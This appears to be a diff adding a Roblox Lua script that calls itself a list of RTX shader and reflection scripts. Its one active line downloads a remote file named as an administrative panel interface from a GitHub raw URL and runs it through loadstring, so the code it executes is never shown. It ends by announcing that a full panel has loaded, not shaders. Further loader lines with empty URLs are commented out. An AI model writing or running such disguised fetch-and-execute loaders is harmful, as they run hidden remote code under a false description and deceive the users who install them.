@@ -1,0 +1,36 @@
+--[[ 
+===========================================================
+       Lista de Scripts para Shader RTX - Roblox
+===========================================================
+]]
+
+print("🚀 Iniciando sistema...")
+
+-- 1. Reflexos RTX.
+print("🌇 Carregando Reflexos...")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kauericardo159-hub/Painel-Administrativo/refs/heads/main/%F0%9F%93%9C%3A%20PanelInterface.lua"))()
+task.wait(1)
+
+--[[
+-- 2. LISTA DE COMANDOS & FUNÇÕES
+print("🌇 Carregando Lista de Comandos...")
+loadstring(game:HttpGet(""))()
+task.wait(1)
+
+-- 3. LISTA DE COMANDOS & FUNÇÕES
+print("🌇 Carregando Extra Lista de Comandos...")
+loadstring(game:HttpGet(""))()
+task.wait(1)
+
+-- 4. 
+print("🌇 Carregando Controlador do Botão...")
+loadstring(game:HttpGet(""))()
+task.wait(1)
+
+-- 5. 
+print("🌇 Carregando Perfil do Usuário...")
+loadstring(game:HttpGet(""))()
+]]
+
+print("✅ Painel Completo Carregado com Sucesso!")
+
